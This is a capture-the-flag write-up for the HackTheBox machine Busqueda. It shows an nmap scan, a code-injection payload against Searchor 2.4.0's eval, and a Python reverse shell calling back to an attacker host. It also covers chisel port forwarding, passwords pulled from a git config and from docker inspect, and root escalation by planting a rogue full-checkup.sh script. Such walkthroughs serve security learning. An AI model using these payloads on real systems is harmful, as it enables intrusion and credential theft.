# HackTheBox - Busqueda

## NMAP

```bash
Nmap scan report for 10.10.11.208
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80 (HTTP)

Visting the webserver, it redirects to `searcher.htb` , so let's add this domain in `/etc/hosts` file

<img src="https://i.imgur.com/WFGCQXp.png"/>
<img src="https://i.imgur.com/UG4CMb5.png"/>

<img src="https://i.imgur.com/Yp4cap6.png"/>

At bottom, we can see the version, `Searchor 2.4.0`

<img src="https://i.imgur.com/wI9waXO.png"/>

Searching for exploits realted to Searchror, there's remote code execution (RCE)

<img src="https://i.imgur.com/7g3ku0Y.png"/>

<img src="https://i.imgur.com/NburH7P.png"/>


## Foothold

From the commit in the github repository, we can see `eval` is being used which will evaluate anything as a valid code or will execute it

```python
', exec("import os;os.system('id')"))#
```

<img src="https://i.imgur.com/UMQYrDT.png"/>

From here on we can get a shell 

```python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.92',2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"))#
```

<img src="https://i.imgur.com/yc9yBZp.png"/>

<img src="https://i.imgur.com/MrLpqRi.png"/>

After having a shell, stabilizing it to get a full tty with python3

<img src="https://i.imgur.com/10k9KNm.png"/>

Checking if we have ability to execute anything as a root or any other user with `sudo -l`

<img src="https://i.imgur.com/Tm7Bojt.png"/>

Looking at local running services, there's port 3000 open which is running an instance of `gitea`

<img src="https://i.imgur.com/ErEtlyZ.png"/>

<img src="https://i.imgur.com/TT3IbfV.png"/>

But it requires credentials so there's no use of moving there unless we have found credentials 

## Privilege Escalation (root)

From config file from `/var/www/app/.git` we can find the password for user cody on gitea which works for svc

<img src="https://i.imgur.com/zm6OpwH.png"/>

With `sudo -l` we can check what we can run

<img src="https://i.imgur.com/0p46QIl.png"/>

Running `system-checkup.py` as a root user, through this script we can run commands like `docker-ps`, `docker-inspect` and `full-checkup`

<img src="https://i.imgur.com/Cd810Sv.png"/>

<img src="https://i.imgur.com/WpFUyfu.png"/>

We can inspect the config file of mysql_db container

```bash
sudo -u 'root' /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
```

On Inpsecting the config file, we'll get both gitea and root mysql user's password

<img src="https://i.imgur.com/7hc9Ieq.png"/>

With gitea mysql user we can login to gitea database

<img src="https://i.imgur.com/ZkCrdjR.png"/>

Now that we have credentials, we can try logging on gitea by port forwarding port 3000

```bash
chisel client 10.10.14.92:3333 R:localhost:3000
chisel server -p 3333 --reverse 
```

<img src="https://i.imgur.com/LAYhvqd.png"/>

Logging in with cody's account, there's nothing there except for the Seracher_site repo which is just the site that we saw at the beginning

<img src="https://i.imgur.com/csnLUWe.png"/>

Using gitea database password, we can login as the administrator

<img src="https://i.imgur.com/vJCrzhX.png"/>

We have access to the scripts folder having those python scripts, so we can read what `system-checkup.py` script actually is doing

<img src="https://i.imgur.com/7K8abWN.png"/>

<img src="https://i.imgur.com/Q8YBuHJ.png"/>

<img src="https://i.imgur.com/jzHttNW.png"/>

From the `system-checkup.py` we can see that it's using subprocess to execute commands which is safe to use for executing system comamnds but if see the `full-checkup` command, it's using a script named `full-checkup.sh` and executing it, so we need to create a script named full-checkup.sh and put our reverse shell to get it executed

<img src="https://i.imgur.com/Mht5rjR.png"/>

<img src="https://i.imgur.com/WznkQXN.png"/>



## References

- https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303
- https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
- https://buildvirtual.net/how-to-use-docker-inspect/
